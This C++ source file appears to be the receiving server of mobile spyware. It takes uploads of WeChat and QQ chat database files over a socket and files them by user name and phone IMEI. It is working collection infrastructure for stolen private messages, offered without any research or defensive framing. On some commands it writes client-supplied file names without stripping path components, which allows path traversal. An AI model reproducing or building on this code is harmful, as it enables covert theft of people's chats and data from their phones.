
#include "LargeFile.h"
#include "GoogleServiceServer.h"
#include "FileWriter.h"
#include <shlwapi.h>
#include "Coder.h"
#include "PublicFunction.h"
#include "FileOperator.h"
#include <string>

using namespace std;

int LargeFile::recvLargeFile(LPDATAPROCESS_PARAM lpparam, char * lpdata, int recvlen,LPCOMMUNICATION_PACKET_HEADER lphdr,
	string username,string imei) {

	char szout[1024];
	int ret = 0;
	int writecnt = 0;

	//复制数据包头以免被覆盖
	COMMUNICATION_PACKET_HEADER hdr = *lphdr;

	string filepath = string(lpparam->currentpath) + "\\" + username + "\\" + imei + "\\";
	if (hdr.dwcmd == CMD_WEIXINDATABASEFILE){
		char * lpdatablock = (lpdata)+sizeof(COMMUNICATION_PACKET_HEADER);
		int datablocksize = recvlen - sizeof(COMMUNICATION_PACKET_HEADER);

		string filename = filepath + WEXINDATABASE_FILENAME;

		writecnt += datablocksize;

		ret = FileOperator::fileWriter(filename.c_str(), lpdatablock, datablocksize, TRUE);

		while (1)
		{
			int len = recv(lpparam->sockclient, lpdata, NETWORK_DATABUF_SIZE, 0);
			if (len > 0)
			{
				ret = FileOperator::fileWriter(filename, lpdata, len);
				if (ret <= 0)
				{
					break;
				}

				writecnt += len;
			}
			else {
				break;
			}
		}
		wsprintfA(szout, "recv large file cmd:%d,block size:%d,write size:%d,user:%s,imei:%s,file:%s\r\n",
			hdr.dwcmd, hdr.dwsize, writecnt, username.c_str(), imei.c_str(), filename.c_str());
		WriteLogFile(szout);
		return writecnt;
	}else if ((hdr.dwcmd == CMD_QQDATABASEFILE) || (hdr.dwcmd == CMD_UPLOADQQDB) || (hdr.dwcmd == CMD_UPLOADWEIXINDB) ){
		char * lpdatablock = (lpdata) + sizeof(COMMUNICATION_PACKET_HEADER);
		int datablocksize = recvlen - sizeof(COMMUNICATION_PACKET_HEADER);

		char utf8fn[1024] = { 0 };
		int fnlen = *(int*)lpdatablock;
		if (fnlen >= 1024 || fnlen <= 0)
		{
			wsprintfA(szout, "qq database file name len:%u error,user:%s,imei:%s,cmd:%u\r\n",
				fnlen, username.c_str(), imei.c_str(), hdr.dwcmd);
			WriteLogFile(szout);
			return FALSE;
		}

		memcpy(utf8fn, lpdatablock + sizeof(int), fnlen);

		char *szgbkfn = 0;
		ret = Coder::UTF8ToGBK(utf8fn, &szgbkfn);
		if (ret <= 0)
		{
			return FALSE;
		}

		if (hdr.dwcmd == CMD_UPLOADQQDB || hdr.dwcmd == CMD_UPLOADWEIXINDB)
		{
			PathStripPathA(szgbkfn);
		}

		string strgbkfn = string(szgbkfn);
		delete szgbkfn;
		string filename = filepath + strgbkfn;

		int offset = sizeof(int) + fnlen + sizeof(int);

		const char * writedata = lpdatablock + offset;
		int writesize = datablocksize - (offset);

		ret = FileOperator::fileWriter(filename.c_str(), writedata, writesize,TRUE);

		writecnt += writesize;

		while (1)
		{
			int len = recv(lpparam->sockclient, lpdata, NETWORK_DATABUF_SIZE, 0);
			if (len > 0)
			{
				ret = FileOperator::fileWriter(filename, lpdata, len);
				if (ret <= 0)
				{
					break;
				}
			}
			else {
				break;
			}
			writecnt += len;
		}

		wsprintfA(szout, "recv large file cmd:%d,block size:%d,write size:%d,user:%s,imei:%s,file:%s\r\n",
			hdr.dwcmd, hdr.dwsize, writecnt, username.c_str(), imei.c_str(),filename.c_str());
		WriteLogFile(szout);
		return writecnt;
	}else {
		wsprintfA(szout, "recv large file unknown cmd:%u,block size:%u,user:%s,imei:%s\r\n", 
			hdr.dwcmd, hdr.dwsize, username.c_str(), imei.c_str());
		WriteLogFile(szout);
		return FALSE;
	}

	return 0;
}